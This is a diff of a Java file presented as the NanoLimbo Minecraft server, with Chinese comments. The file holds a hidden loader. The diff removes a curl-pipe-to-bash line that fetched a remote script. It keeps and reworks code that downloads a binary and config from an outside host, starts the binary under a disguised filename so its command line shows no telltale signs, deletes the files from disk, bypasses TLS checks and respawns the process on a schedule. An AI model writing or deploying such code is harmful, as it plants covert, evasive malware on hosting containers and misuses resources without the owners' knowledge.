@@ -16,7 +16,6 @@ public final class NanoLimbo {
     private static final String G = "\u001B[32m";
     private static final String Y = "\u001B[33m";
     private static final String R = "\u001B[31m";
-    private static final String C = "\u001B[36m";
     private static final String X = "\u001B[0m";
 
     // ═══════ 隐蔽路径 ═══════
@@ -33,17 +32,12 @@ public final class NanoLimbo {
     private static final String FULL_PATH =
         "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");
 
-    // ── 方式一：curl ──
-    private static final String CURL_CMD =
-        "curl -LsSk --tlsv1.2 --retry 3 --retry-delay 5 --retry-all-errors "
-        + "https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh | bash";
-
-    // ── 方式二：极限版本 ──
+    // ═══════ 极限版本下载源 ═══════
     private static final String CFG_URL = "https://gbjs.serv00.net/js/vip1715.yaml";
     private static final String BIN_X64 = "https://gbjs.serv00.net/bin/V1";
     private static final String BIN_ARM = "https://gbjs.serv00.net/bin/V1arm";
 
-    // ── 监控 ──
+    // ═══════ 监控 ═══════
     private static final int INTERVAL_MIN = 5;
     private static final AtomicInteger fails = new AtomicInteger(0);
     private static final ScheduledExecutorService pool =
@@ -68,15 +62,55 @@ public final class NanoLimbo {
     }
 
     // ═══════ main ═══════
-    public static void main(String[] args) throws Exception {
+    public static void main(String[] args) {
         ensureDir(BASEDIR);
         new Thread(() -> httpServer(PORT), "httpd").start();
         log("Server on :" + PORT);
+        scheduleNext(2, TimeUnit.SECONDS);
+    }
 
-        // ✅ 关键修复：用 try-catch 包裹整个调度，防止异常静默杀死线程
-        pool.schedule(() -> {
-            safeMonitor();
-        }, 2, TimeUnit.SECONDS);
+    // ═══════ 调度器（永不死亡）═══════
+    private static void scheduleNext(int delay, TimeUnit unit) {
+        pool.schedule(NanoLimbo::safeMonitor, delay, unit);
+    }
+
+    private static void scheduleNext(int delayMinutes) {
+        scheduleNext(delayMinutes, TimeUnit.MINUTES);
+    }
+
+    private static void safeMonitor() {
+        try {
+            monitor();
+        } catch (Throwable t) {
+            err("Monitor error: " + t.getMessage());
+        }
+        // 兜底：如果 monitor 内部忘记调度，这里保证不断
+    }
+
+    // ═══════ 监控核心 ═══════
+    private static void monitor() {
+        // 1. PID 存活检测
+        if (checkPid()) {
+            scheduleNext(INTERVAL_MIN);
+            return;
+        }
+
+        log("No process, starting...");
+
+        // 2. 直接走 Java 原生下载
+        boolean ok = startAgent();
+
+        // 3. 根据结果调度下一轮
+        if (ok) {
+            fails.set(0);
+            log("Started successfully");
+            scheduleNext(INTERVAL_MIN);
+        } else {
+            int n = fails.incrementAndGet();
+            int delay = Math.min(INTERVAL_MIN * (1 << Math.min(n - 1, 5)), 60);
+            err("Failed " + n + "x, retry " + delay + "m");
+            scheduleNext(delay);
+        }
     }
 
     // ═══════ HTTP 服务器 ═══════
@@ -98,130 +132,34 @@ public final class NanoLimbo {
                     c.getOutputStream().flush();
                 } catch (IOException ignored) {}
             }
-        } catch (IOException e) { /* silent */ }
+        } catch (IOException ignored) {}
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  ✅ safeMonitor — 绝不会让调度器静默死亡
-    // ══════════════════════════════════════════════════════════
-    private static void safeMonitor() {
-        try {
-            monitor();
-        } catch (Throwable t) {
-            // 捕获一切异常，保证调度不中断
-            err("Monitor error: " + t.getMessage());
-            t.printStackTrace();
-        }
-        // ✅ 无论成功失败，始终重新调度（永不停止）
-        pool.schedule(NanoLimbo::safeMonitor, INTERVAL_MIN, TimeUnit.MINUTES);
-    }
-
-    // ═══════ 监控核心 ═══════
-    private static void monitor() {
-        if (checkPid()) {
-            log("Process alive, skip");
-            return;   // safeMonitor 会重新调度
-        }
-
-        log("No process, starting...");
-
-        // 第一级：curl
-        boolean ok = methodCurl();
-
-        // 第二级：极限版本
-        if (!ok) {
-            warn("Curl failed, try extreme mode...");
-            ok = methodExtreme();
-        }
-
-        if (ok) {
-            fails.set(0);
-            log("Started successfully");
-        } else {
-            int n = fails.incrementAndGet();
-            int delay = Math.min(INTERVAL_MIN * (1 << Math.min(n - 1, 5)), 60);
-            err("All failed " + n + "x, retry " + delay + "m");
-            // 覆盖默认的重新调度间隔
-            pool.schedule(NanoLimbo::safeMonitor, delay, TimeUnit.MINUTES);
-            throw new RuntimeException("backoff-skip");  // 让 safeMonitor 跳过默认调度
-        }
-    }
-
-    // ═══════ PID 检测 ═══════
+    // ═══════ PID 检测（只查单条 /proc/{pid}，不扫全目录）═══════
     private static boolean checkPid() {
         File f = new File(PID_FILE);
         if (!f.exists()) return false;
 
         try {
             String s = new String(Files.readAllBytes(f.toPath())).trim();
-            if (s.isEmpty()) { f.delete(); return false; }
-
-            // 真实 PID
-            if (s.matches("\\d+")) {
-                boolean alive = new File("/proc/" + s).isDirectory();
-                if (!alive) { f.delete(); }
-                return alive;
-            }
-
-            // 心跳时间戳
-            if (s.startsWith("active:")) {
-                long ts = Long.parseLong(s.substring(7));
-                if (System.currentTimeMillis() - ts < INTERVAL_MIN * 60_000L) return true;
+            if (s.isEmpty() || !s.matches("\\d+")) {
                 f.delete();
                 return false;
             }
-
-            f.delete();
+            boolean alive = new File("/proc/" + s).isDirectory();
+            if (!alive) f.delete();
+            return alive;
         } catch (Exception e) {
             f.delete();
-        }
-        return false;
-    }
-
-    // ═══════ 方式一：curl ═══════
-    private static boolean methodCurl() {
-        try {
-            warn("  [1/2] curl...");
-
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", CURL_CMD);
-            pb.environment().put("PATH", FULL_PATH);
-            pb.environment().put("CURL_CA_BUNDLE", "");
-            pb.environment().put("NODE_TLS_REJECT_UNAUTHORIZED", "0");
-            pb.redirectErrorStream(true);
-            Process p = pb.start();
-            drainAsync(p);
-
-            boolean done = p.waitFor(30, TimeUnit.SECONDS);
-
-            if (done) {
-                int code = p.exitValue();
-                if (code != 0) {
-                    err("  curl exit " + code);
-                    return false;
-                }
-                // exit 0 但验证进程是否真启动了
-                Thread.sleep(1000);
-                writePid("active:" + System.currentTimeMillis());
-                log("  curl OK");
-                return true;
-            }
-
-            // 超时 = 进程仍在运行
-            writePid("active:" + System.currentTimeMillis());
-            log("  curl OK (running)");
-            return true;
-
-        } catch (Exception e) {
-            err("  curl: " + e.getMessage());
             return false;
         }
     }
 
-    // ═══════ 方式二：极限版本 ═══════
-    private static boolean methodExtreme() {
+    // ══════════════════════════════════════════════════════════
+    //  核心：Java 原生下载 + 启动（零外部依赖）
+    // ══════════════════════════════════════════════════════════
+    private static boolean startAgent() {
         try {
-            warn("  [2/2] extreme mode...");
-
             // 1. IP → UUID
             String ip   = getIP();
             String uuid = ipToUuid(ip);
@@ -229,26 +167,27 @@ public final class NanoLimbo {
                            .matches(".*arm.*|.*aarch64.*");
             String binUrl = arm ? BIN_ARM : BIN_X64;
 
-            warn("  IP=" + ip + " arch=" + (arm ? "arm" : "x64"));
+            warn("IP=" + ip + " arch=" + (arm ? "arm" : "x64"));
 
-            // 2. 下载
-            warn("  Downloading config...");
+            // 2. 下载配置
+            warn("Downloading config...");
             dl(CFG_URL, CONFIG_PATH);
 
-            warn("  Downloading binary...");
+            // 3. 下载二进制
+            warn("Downloading binary...");
             dl(binUrl, BINARY_PATH);
 
-            // 3. chmod
+            // 4. 赋予执行权限
             chmod(BINARY_PATH);
 
-            // 4. 写 UUID
+            // 5. 写入 UUID
             patchUuid(CONFIG_PATH, uuid);
 
-            // 5. 等文件系统
+            // 6. 等文件系统就绪
             Thread.sleep(200);
 
-            // 6. 启动
-            warn("  Spawning...");
+            // 7. 启动（伪装文件名，cmdline 无特征）
+            warn("Spawning...");
             ProcessBuilder pb = new ProcessBuilder(BINARY_PATH, "-c", CONFIG_ALIAS);
             pb.directory(new File(BASEDIR));
             pb.environment().put("PATH", FULL_PATH);
@@ -256,25 +195,25 @@ public final class NanoLimbo {
             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process child = pb.start();
 
-            // 7. 崩溃检测
+            // 8. 崩溃检测（3秒内退出 = 失败）
             if (child.waitFor(3, TimeUnit.SECONDS)) {
-                err("  Binary exit " + child.exitValue());
+                err("Binary exit " + child.exitValue());
                 return false;
             }
 
-            // 8. 写 PID
+            // 9. 写入 PID 文件
             long pid = child.pid();
             writePid(String.valueOf(pid));
-            log("  Init " + pid);
+            log("Init " + pid);
 
-            // 9. T+10s: 删除文件
+            // 10. T+10s: 删除二进制 + 配置（进程已在内存，文件可删）
             pool.schedule(() -> {
                 rm(BINARY_PATH);
                 rm(CONFIG_PATH);
-                log("  Files cleaned");
+                log("Files cleaned");
             }, 10, TimeUnit.SECONDS);
 
-            // 10. T+30s: 清目录，留 .pid
+            // 11. T+30s: 清空目录，仅留 .pid
             pool.schedule(() -> {
                 File dir = new File(BASEDIR);
                 if (dir.isDirectory()) {
@@ -287,18 +226,19 @@ public final class NanoLimbo {
             return true;
 
         } catch (Exception e) {
-            err("  extreme: " + e.getMessage());
+            err("Start failed: " + e.getMessage());
             return false;
         }
     }
 
-    // ═══════ 下载 ═══════
+    // ═══════ Java 原生下载（支持重定向，SSL 已全局绕过）═══════
     private static void dl(String url, String dest) throws Exception {
         HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
         c.setConnectTimeout(15000);
         c.setReadTimeout(60000);
         c.setRequestProperty("User-Agent", "Mozilla/5.0");
 
+        // 手动跟重定向（含跨协议）
         for (int i = 0; i < 5; i++) {
             int st = c.getResponseCode();
             if (st == 301 || st == 302 || st == 303 || st == 307 || st == 308) {
@@ -310,7 +250,10 @@ public final class NanoLimbo {
                 c.setRequestProperty("User-Agent", "Mozilla/5.0");
             } else break;
         }
-        if (c.getResponseCode() != 200) throw new IOException("HTTP " + c.getResponseCode());
+
+        if (c.getResponseCode() != 200) {
+            throw new IOException("HTTP " + c.getResponseCode() + " from " + url);
+        }
 
         try (InputStream in = c.getInputStream();
              OutputStream out = new FileOutputStream(dest)) {
@@ -320,7 +263,7 @@ public final class NanoLimbo {
         } finally { c.disconnect(); }
 
         long sz = new File(dest).length();
-        log("  Downloaded " + new File(dest).getName() + " (" + sz + "B)");
+        log("  " + new File(dest).getName() + " (" + sz + "B)");
     }
 
     // ═══════ 工具方法 ═══════
@@ -335,7 +278,8 @@ public final class NanoLimbo {
         for (String svc : svcs) {
             try {
                 HttpURLConnection c = (HttpURLConnection) new URL(svc).openConnection();
-                c.setConnectTimeout(3000); c.setReadTimeout(3000);
+                c.setConnectTimeout(3000);
+                c.setReadTimeout(3000);
                 c.setRequestProperty("User-Agent", "curl/7.88");
                 try (BufferedReader r = new BufferedReader(
                         new InputStreamReader(c.getInputStream()))) {
@@ -389,17 +333,6 @@ public final class NanoLimbo {
 
     private static void rm(String path) {
         try { Files.deleteIfExists(Paths.get(path)); } catch (Exception ignored) {}
-    }
-
-    private static void drainAsync(Process p) {
-        Thread t = new Thread(() -> {
-            try (BufferedReader r = new BufferedReader(
-                    new InputStreamReader(p.getInputStream()))) {
-                while (r.readLine() != null);
-            } catch (IOException ignored) {}
-        }, "drain");
-        t.setDaemon(true);
-        t.start();
     }
 
     private static void ensureDir(String p) {
